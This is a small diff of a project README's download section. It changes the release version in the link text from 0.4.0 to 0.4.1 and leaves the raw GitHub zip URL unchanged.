@@ -19,7 +19,7 @@
 
 ## Download and install
 
-[Download the latest release (version 0.4.0)](https://raw.githubusercontent.com/peter88213/yw2yw2oxmlllin/dist/yw2oxml.99.0.zip)
+[Download the latest release (version 0.4.1)](https://raw.githubusercontent.com/peter88213/yw2yw2oxmlllin/dist/yw2oxml.99.0.zip)
 
 [Instructions for installation and use](usage)
 
